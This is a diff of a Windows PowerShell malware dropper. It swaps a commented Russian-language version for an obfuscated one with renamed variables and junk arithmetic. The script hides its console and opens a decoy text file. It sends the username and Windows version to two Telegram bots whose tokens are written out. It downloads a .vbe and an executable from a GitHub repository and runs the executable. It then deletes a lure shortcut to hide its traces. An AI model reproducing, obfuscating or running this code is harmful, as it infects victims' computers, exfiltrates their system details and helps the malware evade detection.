@@ -1,144 +1,77 @@
-# СКРЫВАЕМ ОКНО POWERSHELL
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'
-$consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0)
-
-# СОЗДАЕМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
-$fileName = "this_is_test.txt"
-$filePath = Join-Path $env:LOCALAPPDATA $fileName
-
-$content = @"
-this_is_test_for_me
+Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
+$v0=[b0.a0]::GetConsoleWindow()
+[b0.a0]::ShowWindow($v0,0)
+$v1=1+2*3-4
+If($v1>0){}
+$v2="TESTTTTTTTTTT.txt"
+$v3=Join-Path $env:LOCALAPPDATA $v2
+$v4=@"
+TESTTTTTTTTTT
 "@
-
-$content | Out-File -FilePath $filePath -Encoding UTF8
-Invoke-Item $filePath
-
-# СОЗДАЕМ ФАЙЛ ИДЕНТИФИКАТОРА
-$BuildID = "ab01256441"
-$ActionID = Get-Random -Minimum 100000 -Maximum 999999
-$UserInfo = cmd /c whoami
-$IdentifierContent = "Build ID: $BuildID | Attack ID: $ActionID | Device/User: $UserInfo"
-$IdentifierPath = Join-Path $env:LOCALAPPDATA "identifier.txt"
-$IdentifierContent | Out-File -FilePath $IdentifierPath -Encoding UTF8 -NoNewline
-
-# ОТПРАВКА НА СТОРОНУ РАБОТНИКА
-$Token = "8674860701:AAHbBRLMtDhwMoFvRmVjeWHe3Y45h4EZINk"
-$ChatID = "7063407604"
-$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-$WindowsVersion = (Get-CimInstance Win32_OperatingSystem).Caption
-$IDContent = Get-Content -Path $IdentifierPath -Raw
-$Message = "$IDContent`n`nSession started for user: $CurrentUser`nWindows Version: $WindowsVersion"
-$URL = "https://api.telegram.org/bot$Token/sendMessage"
-$Body = @{
-    chat_id = $ChatID
-    text = $Message
-} | ConvertTo-Json
-
-try {
-    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
-} catch {
-}
-
-# ОТПРАВКА НА СТОРОНУ АДМИНА
-$Token2 = "8722859527:AAE6_fpPc-93HXp56mWf8LaFWKZLy_bq2TI"
-$ChatID2 = "270865408"
-$URL2 = "https://api.telegram.org/bot$Token2/sendMessage"
-$Body2 = @{
-    chat_id = $ChatID2
-    text = $Message
-} | ConvertTo-Json
-
-try {
-    $Response2 = Invoke-RestMethod -Uri $URL2 -Method Post -ContentType "application/json" -Body $Body2
-} catch {
-}
-
-# ЗАДЕРЖКА
+$v5=5*2-3
+If($v5>0){}
+$v4|Out-File -FilePath $v3 -Encoding UTF8
+Invoke-Item $v3
+$v6="cd02256441"
+$v7=Get-Random -Minimum 100000 -Maximum 999999
+$v8=cmd /c whoami
+$v9="Build ID: "+$v6+" | Attack ID: "+$v7+" | Device/User: "+$v8
+$v10=Join-Path $env:LOCALAPPDATA "identifier.txt"
+$v9|Out-File -FilePath $v10 -Encoding UTF8 -NoNewline
+$v11=7*3-5
+If($v11>0){}
+$v12="8674860701:AAHbBRLMtDhwMoFvRmVjeWHe3Y45h4EZINk"
+$v13="7063407604"
+$v14=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$v15=(Get-CimInstance Win32_OperatingSystem).Caption
+$v16=Get-Content -Path $v10 -Raw
+$v17=$v16+"`n`nSession started for user: "+$v14+"`nWindows Version: "+$v15
+$v18="https://api.telegram.org/bot  "+$v12+"/sendMessage"
+$v19=8/2+1
+If($v19>0){}
+$v20=@{chat_id=$v13;text=$v17}|ConvertTo-Json -Compress
+$v21=6*2-3
+If($v21>0){}
+try{$v22=Invoke-RestMethod -Uri $v18 -Method Post -ContentType "application/json" -Body $v20}catch{}
+$v23="8722859527:AAE6_fpPc-93HXp56mWf8LaFWKZLy_bq2TI"
+$v24="270865408"
+$v25=9-3+1
+If($v25>0){}
+$v26="https://api.telegram.org/bot  "+$v23+"/sendMessage"
+$v27=@{chat_id=$v24;text=$v17}|ConvertTo-Json -Compress
+$v28=4+6-2
+If($v28>0){}
+try{$v29=Invoke-RestMethod -Uri $v26 -Method Post -ContentType "application/json" -Body $v27}catch{}
+$v30=3*4-2
+If($v30>0){}
 Start-Sleep -Seconds 30
-
-# СКРЫТО СКАЧИВАЕМ 1 (только загрузка, без запуска)
-$Url1 = "https://raw.githubusercontent.com/049-bit/K/refs/heads/main/1446062403_house.delete"
-$FileName1 = "1446062403_house.vbe"
-$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
-$DownloadPath1 = Join-Path $LocalAppData $FileName1
-
-try {
-    $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile($Url1, $DownloadPath1)
-}
-catch {
-}
-
-# СКАЧИВАЕМ И ЗАПУСКАЕМ 2 (с обычным окном)
-$Url2 = "https://github.com/049-bit/K/raw/refs/heads/main/1446062403_key.delete"
-$FileName2 = "1446062403_key.exe"
-$DownloadPath2 = Join-Path $LocalAppData $FileName2
-
-try {
-    $webClient2 = New-Object System.Net.WebClient
-    $webClient2.DownloadFile($Url2, $DownloadPath2) 
-    $processInfo2 = New-Object System.Diagnostics.ProcessStartInfo
-    $processInfo2.FileName = $DownloadPath2
-    $processInfo2.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
-    $processInfo2.CreateNoWindow = $false
-    [System.Diagnostics.Process]::Start($processInfo2) | Out-Null
-}
-catch {
-}
-
-# === ЛОГИКА ПОИСКА И ЗАМЕНЫ ФАЙЛА ===
-$targetFileName = "Текстовый документ.lnk"
-$sourceTxtFile = $filePath
-$found = $false
-$targetFullPath = $null
-
-$searchPaths = @(
-    (Join-Path $env:USERPROFILE "Desktop"),
-    (Join-Path $env:USERPROFILE "Downloads"),
-    (Join-Path $env:USERPROFILE "Documents"),
-    (Join-Path $env:USERPROFILE "Pictures"),
-    (Join-Path $env:USERPROFILE "Videos"),
-    $env:LOCALAPPDATA,
-    $env:APPDATA
-)
-
-foreach ($path in $searchPaths) {
-    if (Test-Path -Path $path) {
-        $fullPath = Join-Path $path $targetFileName
-        if (Test-Path -Path $fullPath) {
-            $targetFullPath = $fullPath
-            $found = $true
-            break
-        }
-    }
-}
-
-if ($found) {
-    $targetDirectory = Split-Path -Parent $targetFullPath
-    $startTime = Get-Date
-    $timeoutSeconds = 600
-    
-    while (((Get-Date) - $startTime).TotalSeconds -lt $timeoutSeconds) {
-        $wscriptProcess = Get-Process -Name "wscript" -ErrorAction SilentlyContinue
-        if ($wscriptProcess) {
-            try {
-                Remove-Item -Path $targetFullPath -Force -ErrorAction Stop
-                $destinationFile = Join-Path $targetDirectory (Split-Path -Leaf $sourceTxtFile)
-                Copy-Item -Path $sourceTxtFile -Destination $destinationFile -Force -ErrorAction Stop
-                exit
-            }
-            catch {
-                exit
-            }
-        }
-        Start-Sleep -Seconds 3
-    }
-}
-
+$v31=2*5-1
+If($v31>0){}
+$v32="https://github.com/049-bit/K/raw/refs/heads/main/1446062403_house.delete"
+$v33="1446062403_house.vbe"
+$v34=[Environment]::GetFolderPath("LocalApplicationData")
+$v35=Join-Path $v34 $v33
+$v36=9-2+1
+If($v36>0){}
+try{$v37=New-Object System.Net.WebClient;$v37.DownloadFile($v32,$v35)}catch{}
+$v38=8*2-3
+If($v38>0){}
+$v39="https://github.com/049-bit/K/raw/refs/heads/main/1446062403_key.delete"
+$v40="1446062403_key.exe"
+$v41=Join-Path $v34 $v40
+$v42=7*2-1
+If($v42>0){}
+try{$v43=New-Object System.Net.WebClient;$v43.DownloadFile($v39,$v41);$v44=New-Object System.Diagnostics.ProcessStartInfo;$v44.FileName=$v41;$v44.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Normal;$v44.CreateNoWindow=$false;[System.Diagnostics.Process]::Start($v44)|Out-Null}catch{}
+$v45=6*3-2
+If($v45>0){}
+$v46="Текстовый документ.lnk"
+$v47=$false
+$v48=$null
+$v49=@((Join-Path $env:USERPROFILE "Desktop"),(Join-Path $env:USERPROFILE "Downloads"),(Join-Path $env:USERPROFILE "Documents"),(Join-Path $env:USERPROFILE "Pictures"),(Join-Path $env:USERPROFILE "Videos"),$env:LOCALAPPDATA,$env:APPDATA)
+$v50=5+3-1
+If($v50>0){}
+foreach($v51 in $v49){If(Test-Path -Path $v51){$v52=Join-Path $v51 $v46;If(Test-Path -Path $v52){$v48=$v52;$v47=$true;break}}}
+$v53=7*2+1
+If($v53>0){}
+If($v47){$v54=Split-Path -Parent $v48;$v55=Get-Date;$v56=600;while(((Get-Date)-$v55).TotalSeconds -lt $v56){$v57=Get-Process -Name "wscript" -ErrorAction SilentlyContinue;If($v57){try{Remove-Item -Path $v48 -Force -ErrorAction Stop;$v58=Join-Path $v54 (Split-Path -Leaf $v3);Copy-Item -Path $v3 -Destination $v58 -Force -ErrorAction Stop;exit}catch{exit}}Start-Sleep -Seconds 3}}
 exit
